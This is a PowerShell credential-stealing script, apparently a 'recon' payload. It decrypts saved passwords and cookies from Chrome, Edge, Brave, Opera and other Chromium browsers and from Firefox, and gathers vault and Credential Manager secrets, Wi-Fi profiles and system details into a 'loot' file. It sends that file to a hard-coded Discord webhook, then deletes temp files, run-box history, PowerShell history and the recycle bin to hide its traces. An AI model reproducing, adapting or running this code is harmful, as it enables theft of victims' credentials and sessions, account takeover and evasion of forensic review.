      $res = [WinSqlite]::exec($this.db, $heapPtr, 0, 0, [ref] $errMsg)
      [Runtime.InteropServices.Marshal]::FreeHGlobal($heapPtr);

      if ($res -ne [WinSqlite]::OK) {
         write-warning "sqliteExec: $errMsg"
      }

   }

   [sqliteStmt] prepareStmt(
      [String] $sql
   ) {

      $stmt = [sqliteStmt]::new($this)
      [IntPtr] $handle_ = 0
      $res = [WinSqlite]::prepare_v2($this.db, $sql, -1, [ref] $handle_, 0)
      $stmt.handle = $handle_

      if ($res -ne [WinSqlite]::OK) {
         write-warning "prepareStmt: sqlite3_prepare failed, res = $res"
         write-warning ($this.errmsg())
         return $null
      }
      return $stmt
   }

   [IntPtr] hidden nextStmt([IntPtr] $stmtHandle) {
      return [WinSqlite]::next_stmt($this.db, $stmtHandle)
   }

   [void] close() {

      $openStmtHandles = new-object System.Collections.Generic.List[IntPtr]

     [IntPtr] $openStmtHandle = 0
      while ( ($openStmtHandle = $this.nextStmt($openStmtHandle)) -ne 0) {
          $openStmtHandles.add($openStmtHandle)
      }
      foreach ($openStmtHandle in $openStmtHandles) {
          $res = [WinSqlite]::finalize($openStmtHandle)
          if ($res -ne [WinSqlite]::OK) {
             throw "sqliteFinalize: res = $res"
          }
      }

      $res = [WinSqlite]::close($this.db)

      if ($res -ne [WinSqlite]::OK) {

         if ($res -eq [WinSqlite]::BUSY) {
            write-warning "Close database: database is busy"
         }
         else {
            write-warning "Close database: $res"
            write-warning ($this.errmsg())
         }
         write-error ($this.errmsg())
         throw "Could not close database"
      }
   }

   [Int64] last_insert_rowid() {
       return [WinSqlite]::last_insert_rowid($this.db)
   }

   [String] errmsg() {
      return utf8PointerToStr ([WinSqlite]::errmsg($this.db))
   }

   static [String] version() {
      $h = [Win32]::GetModuleHandle('winsqlite3.dll')
      if ($h -eq 0) {
         return 'winsqlite3.dll is probably not yet loaded'
      }
      $a = [Win32]::GetProcAddress($h, 'sqlite3_version')
      return utf8PointerToStr $a
   }
}

class sqliteStmt {

   [IntPtr  ] hidden $handle
   [sqliteDB] hidden $db

 #
 # Poor man's management of allocated memory on the heap.
 # This is necessary(?) because the SQLite statement interface expects
 # a char* pointer when binding text. This char* pointer must
 # still be valid at the time when the statement is executed.
 # I was unable to achieve that without allocating a copy of the
 # string's bytes on the heap and then release it after the
 # statement-step is executed.
 # There are possibly more elegant ways to achieve this, who knows?
 #
   [IntPtr[]] hidden $heapAllocs

   sqliteStmt([sqliteDB] $db_) {
      $this.db         = $db_
      $this.handle     =   0
      $this.heapAllocs = @()
   }

   [void] bind(
      [Int   ] $index,
      [Object] $value
   ) {

      if ($value -eq $null) {
         $res = [WinSqlite]::bind_null($this.handle, $index)
      }
      elseif ($value -is [String]) {
         [IntPtr] $heapPtr = strToUtf8Pointer($value)

       #
       # The fourth parameter to sqlite3_bind_text() specifies the
       # length of data that is pointed at in the third parameter ($heapPtr).
       # A negative value indicates that the data is terminated by a byte
       # whose value is zero.
       #
         $res = [WinSqlite]::bind_text($this.handle, $index, $heapPtr, -1, 0)

       #
       # Keep track of allocations on heap, free later
       #
         $this.heapAllocs += $heapPtr
      }
      elseif ( $value -is [Int32]) {
         $res = [WinSqlite]::bind_int($this.handle, $index, $value)
      }
      elseif ( $value -is [Int64]) {
         $res = [WinSqlite]::bind_int64($this.handle, $index, $value)
      }
      elseif ( $value -is [Double]) {
         $res = [WinSqlite]::bind_double($this.handle, $index, $value)
      }
      elseif ( $value -is [Bool]) {
         $res = [WinSqlite]::bind_double($this.handle, $index, $value)
      }
      elseif ( $value -is [Byte[]]) {

         [IntPtr] $heapPtr = byteArrayToPointer $value
         $res = [WinSqlite]::bind_blob($this.handle, $index, $heapPtr, $value.length, 0)
       #
       # Keep track of allocations on heap, free later
       #
         $this.heapAllocs += $heapPtr
      }
      else {
         throw "type $($value.GetType()) not (yet?) supported"
      }

      if ($res -eq [WinSqlite]::OK) {
         return
      }

      if ($res -eq [WinSqlite]::MISUSE) {
         write-warning $this.db.errmsg()
         throw "sqliteBind: interface was used in undefined/unsupported way (index = $index, value = $value)"
      }

      if ($res -eq [WinSqlite]::RANGE) {
         throw "sqliteBind: index $index with value = $value is out of range"
      }

      write-warning $this.db.errmsg()
      write-warning "index: $index, value: $value"
      throw "sqliteBind: res = $res"
   }

   [IntPtr] step() {
      $res = [WinSqlite]::step($this.handle)
      foreach ($p in $this.heapAllocs) {
         [IntPtr] $retPtr = [Runtime.InteropServices.Marshal]::FreeHGlobal($p);
      }

    #
    # Free the alloc'd memory that was necessary to pass
    # strings to the sqlite engine:
    #
      $this.heapAllocs = @()

      return $res
   }

   [void] reset() {
      $res = [WinSqlite]::reset($this.handle)

      if ($res -eq [WinSqlite]::CONSTRAINT) {
         write-warning ($this.db.errmsg())
         throw "sqliteRest: violation of constraint"
      }

      if ($res -ne [WinSqlite]::OK) {
         throw "sqliteReset: res = $res"
      }
   }


   [Int32] column_count() {
     #
     # column_count returns the number of columns of
     # a select statement.
     #
     # For non-select statemnt (insert, delete…), column_count
     # return 0.
     #
       return [WinSqlite]::column_count($this.handle)
   }


   [Int32] column_type(
         [Int] $index
   ) {
       return [WinSqlite]::column_type($this.handle, $index)
   }

   [Int32] column_bytes(
         [Int] $index
   ) {
       return [WinSqlite]::column_bytes($this.handle, $index)
   }


   [object] col(
         [Int] $index
   ) {

      $colType =$this.column_type($index)
      switch ($colType) {

         ([WinSqlite]::INTEGER) {
          #
          # Be safe and return a 64-bit integer because there does
          # not seem a way to determine if a 32 or 64-bit integer
          # was inserted.
          #
            return [WinSqlite]::column_int64($this.handle, $index)
         }
         ([WinSqlite]::FLOAT)   {
            return [WinSqlite]::column_double($this.handle, $index)
         }
         ([WinSqlite]::TEXT)    {
            [IntPtr] $charPtr = [WinSqlite]::column_text($this.handle, $index)
            return utf8PointerToStr $charPtr
         }
         ([WinSqlite]::BLOB)   {

            [IntPtr] $blobPtr = [WinSqlite]::column_blob($this.handle, $index)
            return pointerToByteArray $blobPtr $this.column_bytes($index)
         }
         ([WinSqlite]::NULL)    {
            return $null
         }
         default           {
            throw "This should not be possible $([WinSqlite]::sqlite3_column_type($this.handle, $index))"
         }
      }
      return $null
   }

   [void] bindArrayStepReset([object[]] $cols) {
      $colNo = 1
      foreach ($col in $cols) {
          $this.bind($colNo, $col)
          $colNo ++
      }
      $this.step()
      $this.reset()
   }

   [void] finalize() {
      $res = [WinSqlite]::finalize($this.handle)

      if ($res -ne [WinSqlite]::OK) {
         throw "sqliteFinalize: res = $res"
      }
   }
}
'@
# /SQLite

Function Convert-HexToByteArray {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [String]
        $HexString
    )

    $Bytes = [byte[]]::new($HexString.Length / 2)
    For($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    $Bytes
}

# $hexdecKey = ($decKey | ForEach-Object ToString X2) -join '' #Convert byte[] to hex
Function Convert-ByteArrayToHex {
    [cmdletbinding()]
    param(
        [parameter(Mandatory=$true)]
        [Byte[]]
        $Bytes
    )
    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
    ForEach($byte in $Bytes){
        $HexString.AppendFormat("{0:x2}", $byte) > $null
    }
    $HexString.ToString()
}

function Read-ChromiumLCData {
    param (
        $master_key,
        $path,
        $query
    )

    $_rows = [System.Collections.Generic.List[System.Collections.Generic.List[string]]]::new()
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"


    [sqliteDB] $db = [sqliteDB]::new($sDatabasePath, $false)
    $stmt = $db.prepareStmt($query)

    if (-not $stmt) {
        return @();
    }

    while ( $stmt.step()  -ne [WinSqlite]::DONE ) {
        try {
            $encrypted_data = $stmt.col(2);
            if ($encrypted_data.StartsWith("763130") -or $encrypted_data.StartsWith("763131") -or $encrypted_data.StartsWith("76313")) {
                # v10, v11, v1x
                # Ciphertext bytes run 0-2="V10"; 3-14=12_byte_IV; 15 to len-17=payload; final-16=16_byte_auth_tag

                # $encrypted_data = Convert-HexToByteArray $encrypted_data
                # [byte[]]$signature = $encrypted_data[0..2]
                # [byte[]]$iv = $encrypted_data[3..14]
                # [byte[]]$encData = $encrypted_data[15..($encrypted_data.Length-1-16)]
                # [byte[]]$auth_tag = $encrypted_data[-16..-1]

                # [byte[]]$auth_tag = $encrypted_data[($encrypted_data.Length-16)..($encrypted_data.Length-1)]

                # Write-Host "SIGNATURE: $signature"
                # Write-Host "IV: $iv"
                # Write-Host "EncData: $encData"
                # Write-Host "Auth Tag: $auth_tag"

                [void]$_rows.Add(@(
                    $stmt.col(0),
                    $stmt.col(1),
                    $encrypted_data
                    # [System.Convert]::ToBase64String($encrypted_data)
                ))
                continue
            }
            if ($encrypted_data.StartsWith("01000000")) {
                $encrypted_data = Convert-HexToByteArray $encrypted_data
                $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                $decrypted_data = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_data, $null, $UnprotectScope)
                $decrypted_data = [System.Text.Encoding]::ASCII.GetString($decrypted_data)
                [void]$_rows.Add(@(
                    $stmt.col(0),
                    $stmt.col(1),
                    $decrypted_data
                    # [System.Convert]::ToBase64String($encrypted_data)
                ))
                continue
            }
            [void]$_rows.Add(@(
                $stmt.col(0),
                $stmt.col(1),
                $encrypted_data
                # [System.Convert]::ToBase64String($encrypted_data)
            ))
        }catch{}
    }

    $stmt.finalize()
    $db.close()

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}

function Read-ChromiumLocalState {
    param (
        $path
    )

    $localStateFile = "$env:LocalAppData\ChromiumLocalState"
    copy-item "$path" "$localStateFile"
    $encrypted_key = [System.Convert]::FromBase64String((Select-String -Path "$localStateFile" '"encrypted_key":"([^"]+?)"' -AllMatches | Foreach-Object {$_.Matches} | Foreach-Object {$_.Groups[1].Value}))
    Remove-Item -path "$localStateFile" 2> $null

    $UnprotectScope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted_key[5..$encrypted_key.length], $null, $UnprotectScope)
    return [System.Convert]::ToBase64String($decrypted_key)
}

$data = [ordered]@{}

# Chromium
# https://chromium.googlesource.com/chromium/src/+/HEAD/docs/user_data_dir.md
$chrome = @("Chrome", "Chrome Beta", "Chrome SxS")
$chromiumPaths = @()
foreach($_item in $chrome) {
    $chromiumPaths += "$env:LocalAppData\Google\$_item"
}

# Untested
$chromiumPaths += "$env:LocalAppData\Chromium"
$chromiumPaths += "$env:AppData\Opera Software\Opera Stable"
$chromiumPaths += "$env:AppData\Opera Software\Opera GX Stable"
$chromiumPaths += "$env:LocalAppData\Microsoft\Edge"
$chromiumPaths += "$env:LocalAppData\CocCoc\Browser"
$chromiumPaths += "$env:LocalAppData\BraveSoftware\Brave-Browser"
$chromiumPaths += "$env:LocalAppData\Yandex\YandexBrowser"
$chromiumPaths += "$env:LocalAppData\Tencent\QQBrowser"

foreach ($chromiumPath in $chromiumPaths) {
    if ( -not (Test-Path -Path "$chromiumPath") ) {
        continue
    }
    $data[$chromiumPath] = @{}
    try{
        # Read local state data
        $data[$chromiumPath]['decrypted_key'] = Read-ChromiumLocalState -path "$chromiumPath\User Data\Local State"
    }catch{}

    # Read dir
    $folders = Get-ChildItem -Name -Directory "$chromiumPath\User Data"
    foreach ($_folder in $folders) {
        $folder = $_folder.ToLower()
        if (-not ($folder -eq "default" -or $folder.StartsWith("profile "))) {
            continue
        }
        $data[$chromiumPath][$_folder] = [ordered]@{}
        try {
            # Read logins data
            $data[$chromiumPath][$_folder]['logins'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Login Data" -query 'select origin_url,username_value,hex(password_value) from logins'
        }catch{}
        try {
            # Read cookies data
            $data[$chromiumPath][$_folder]['cookies'] = Read-ChromiumLCData -master_key "$data['decrypted_key']" -path "$chromiumPath\User Data\$_folder\Cookies" -query 'select host_key,name,hex(encrypted_value) from cookies'
        }catch{}
    }

}

# Firefox decryptor
try {
    # Load nss3.dll
    $nssdllhandle = [IntPtr]::Zero

    $mozillapaths = $(
        "$env:HOMEDRIVE\Program Files\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files (x86)\Mozilla Firefox",
        "$env:HOMEDRIVE\Program Files\Nightly",
        "$env:HOMEDRIVE\Program Files (x86)\Nightly"
    )

    $mozillapath = ""
    foreach ($p in $mozillapaths) {
        if (Test-Path -path "$p\nss3.dll") {
            $mozillapath = $p
            break
        }
    }

    if ( ("$mozillapath" -ne "") -and (Test-Path -path "$mozillapath") ) {
        $nss3dll = "$mozillapath\nss3.dll"
        $mozgluedll = "$mozillapath\mozglue.dll"
        $msvcr120dll = "$mozillapath\msvcr120.dll"
        $msvcp120dll = "$mozillapath\msvcp120.dll"
        if(Test-Path $msvcr120dll) {
            $msvcr120dllHandle = [Win32]::LoadLibrary($msvcr120dll)
            $LastError= [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error when loading msvcr120.dll: $LastError"
        }

        if(Test-Path $msvcp120dll) {
            $msvcp120dllHandle = [Win32]::LoadLibrary($msvcp120dll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading msvcp120.dll: $LastError" 
        }

        if(Test-Path $mozgluedll) {
            $mozgluedllHandle = [Win32]::LoadLibrary($mozgluedll) 
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last error loading mozglue.dll: $LastError"
        }
        
        if(Test-Path $nss3dll) {
            $nssdllhandle = [Win32]::LoadLibrary($nss3dll)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Last Error loading nss3.dll: $LastError"       
        }
    }
    if(($nssdllhandle -eq 0) -or ($nssdllhandle -eq [IntPtr]::Zero)) {
        Write-Verbose "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        Throw "Could not load nss3.dll"
    }
    # /Load nss3.dll

    # Create the ModuleBuilder
    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False)

    # Define SecItem Struct
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
    $StructBuilder.DefineField('type', [int], 'Public') > $null
    $StructBuilder.DefineField('data', [IntPtr], 'Public') > $null
    $StructBuilder.DefineField('len', [int], 'Public') > $null
    $SecItemType = $StructBuilder.CreateType()

    # $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((DynamicLoadDll "$mozillapath\nss3.dll" NSS_Init), (Get-DelegateType @([string]) ([long])))
    $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Init"), (Get-DelegateType @([string]) ([long])))
    $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "NSS_Shutdown"), (Get-DelegateType @() ([long])))

    $PK11_GetInternalKeySlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_GetInternalKeySlot"), (Get-DelegateType @() ([long])))
    $PK11_FreeSlot = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_FreeSlot"), (Get-DelegateType @([long]) ([void])))
    $PK11_Authenticate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11_Authenticate"), (Get-DelegateType @([long], [bool], [int]) ([long])))

    $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Win32]::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt"), (Get-DelegateType @([Type]$SecItemType.MakeByRefType(),[Type]$SecItemType.MakeByRefType(), [int]) ([int])))

}catch{
    $_
}

# https://github.com/Leslie-Shang/Browser_Decrypt/blob/master/Browser_Decrypt/Firefox_Decrypt.cpp
# https://github.com/techchrism/firefox-password-decrypt/blob/master/ConvertFrom-NSS.ps1
Function FFDecrypt-CipherText {
    param (
        [parameter(Mandatory=$True)]
        [string]$cipherText
    )
    $dataStr = ""
    $slot = $PK11_GetInternalKeySlot.Invoke()
    try{
        if ($PK11_Authenticate.Invoke($slot, $true, 0) -eq 0) {
            # Decode data into bytes and marshal them into a pointer
            $dataBytes = [System.Convert]::FromBase64String($cipherText)
            $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
            [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length) > $null

            # Set up structures
            $encrypted = [Activator]::CreateInstance($SecItemType)
            $encrypted.type = 0
            $encrypted.data = $dataPtr
            $encrypted.len = $dataBytes.Length

            $decrypted = [Activator]::CreateInstance($SecItemType)
            $decrypted.type = 0
            $decrypted.data = [IntPtr]::Zero
            $decrypted.len = 0

            $PK11SDR_Decrypt.Invoke([ref] $encrypted, [ref] $decrypted, 0) > $null

            # Get string data back out
            $bytePtr = $decrypted.data
            $byteData = [byte[]]::new($decrypted.len)
            [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len) > $null
            $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)
        }
    }catch{}
    $PK11_FreeSlot.Invoke($slot) > $null
    return $dataStr
}
# /Firefox decryptor

# Firefox
function Read-FirefoxCookies {
    param (
        $path
    )
    $_rows = [System.Collections.Generic.List[System.Collections.Generic.List[string]]]::new()
    $sDatabasePath="$env:LocalAppData\SQLiteData"
    copy-item "$path" "$sDatabasePath"

    [sqliteDB] $db = [sqliteDB]::new($sDatabasePath, $false)
    $stmt = $db.prepareStmt("select host,name,value from moz_cookies")

    if (-not $stmt) {
        return @();
    }

    while ( $stmt.step()  -ne [WinSqlite]::DONE ) {
        [void]$_rows.Add(@(
            $stmt.col(0),
            $stmt.col(1),
            $stmt.col(2)
        ))
    }

    $stmt.finalize() > $null
    $db.close() > $null

    Remove-Item -path "$sDatabasePath" 2> $null

    return $_rows
}

function Read-FirefoxLogins {
    param (
        $path
    )
    $_rows = [System.Collections.Generic.List[System.Collections.Generic.List[string]]]::new()

    $json = Get-Content "$path" | Out-String | ConvertFrom-Json
    foreach ($login in $json.logins) {
        $_item = @($login.hostname, "deuser err", "depass err", $login.formSubmitURL)
        try{
            $_item[1] = (FFDecrypt-CipherText $login.encryptedUsername)
        }catch{}
        try{
            $_item[2] = (FFDecrypt-CipherText $login.encryptedPassword)
        }catch{}
        [void]$_rows.Add($_item)
    }

    return $_rows
}

# https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data
$profiles = @()
$profiles += (Get-ChildItem -Directory "$env:APPDATA\Mozilla\Firefox\Profiles\").FullName
$profiles += (Get-ChildItem -Directory "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\").FullName
foreach ($profile in $profiles) {
    try {
        if (Test-Path -Path "$profile\cookies.sqlite") {
            $data[$profile]["cookies"] = Read-FirefoxCookies -path "$profile\cookies.sqlite"
        }
    }catch{}
    try {
        if (Test-Path -Path "$profile\logins.json") {
            $data[$profile]["logins"] = Read-FirefoxLogins -path "$profile\logins.json"
        }
    }catch{}
}

############################################################################################################################################################

# MAKE LOOT FOLDER 

$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"

############################################################################################################################################################

# OUTPUTS RESULTS TO LOOT FILE

Clear-Host
Write-Host 

echo "Name:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $FN >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Email:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $EM >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "GeoLocation:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $GL >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
echo "Nearby Wifi:" >> $env:TMP\$FileName
echo "==================================================================" >> $env:TMP\$FileName
echo $NearbyWifi >> $env:TMP\$FileName
echo "" >> $env:TMP\$FileName
$computerSystem.Name >> $env:TMP\$FileName
"==================================================================
Manufacturer: " + $computerSystem.Manufacturer >> $env:TMP\$FileName
"Model: " + $computerSystem.Model >> $env:TMP\$FileName
"Serial Number: " + $computerBIOS.SerialNumber >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
"" >> $env:TMP\$FileName

"OS:
=================================================================="+ ($computerOs | out-string) >> $env:TMP\$FileName

"CPU:
=================================================================="+ ($computerCpu | out-string) >> $env:TMP\$FileName

"RAM:
==================================================================
Capacity: " + $computerRamCapacity + ($computerRam | out-string) >> $env:TMP\$FileName

"Mainboard:
=================================================================="+ ($computerMainboard | out-string) >> $env:TMP\$FileName

"Bios:
=================================================================="+ (Get-WmiObject win32_bios | out-string) >> $env:TMP\$FileName

"Local-user:
=================================================================="+ ($luser | out-string) >> $env:TMP\$FileName

"HDDs:
=================================================================="+ ($Hdds | out-string) >> $env:TMP\$FileName

"COM & SERIAL DEVICES:
=================================================================="+ ($COMDevices | out-string) >> $env:TMP\$FileName

"Network: 
==================================================================
Computers MAC address: " + $MAC >> $env:TMP\$FileName
"Computers IP address: " + $computerIP.ipaddress[0] >> $env:TMP\$FileName
"Public IP address: " + $computerPubIP >> $env:TMP\$FileName
"RDP: " + $RDP >> $env:TMP\$FileName
"" >> $env:TMP\$FileName
($Networks.NetworkInterfaces) >> $env:TMP\$FileName

"W-Lan profiles: 
=================================================================="+ ($Networks.WLANProfiles) >> $env:TMP\$FileName

"Listeners / ActiveTcpConnections
=================================================================="+ ($listener | out-string) >> $env:TMP\$FileName

"Current running process: 
=================================================================="+ ($process | out-string) >> $env:TMP\$FileName

"Services: 
=================================================================="+ ($service | out-string) >> $env:TMP\$FileName

"Installed software:
=================================================================="+ ($software | out-string) >> $env:TMP\$FileName

"Installed drivers:
=================================================================="+ ($drivers | out-string) >> $env:TMP\$FileName

"Installed videocards:
=================================================================="+ ($videocard | out-string) >> $env:TMP\$FileName

"PasswordVault Credentials:
=================================================================="+ $PasswordVaultCreds >> $env:TMP\$FileName

"CredMan Credentials:
=================================================================="+ $CredManCreds >> $env:TMP\$FileName

"Browser Credentials:
=================================================================="+ (ConvertTo-Json $data) >> $env:TMP\$FileName

############################################################################################################################################################

# Recon all User Directories
tree $Env:userprofile /a /f >> $env:TMP\$FileName

############################################################################################################################################################

# Remove Variables

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,process,service,software,drivers,videocard,
vault -ErrorAction SilentlyContinue -Force

############################################################################################################################################################

# Upload output file to Discord

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    $hookurl = 'https://discord.com/api/webhooks/1250802056105558116/z5UHXDrxDZSFN3uRp8mXIAONqGdGhYhM42rbAqRVq6Fas1pXeYsS04VcUpke9IzI5FME'

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) > $null
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl > $null
    }
}

# Call the Upload-Discord function to send the file and text
Upload-Discord -file "$env:TMP\$FileName" -text "Recon data collected from $env:USERNAME's computer"

############################################################################################################################################################

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

############################################################################################################################################################

# Popup message to signal the payload is done

$done = New-Object -ComObject Wscript.Shell; $done.Popup("script is done", 1)
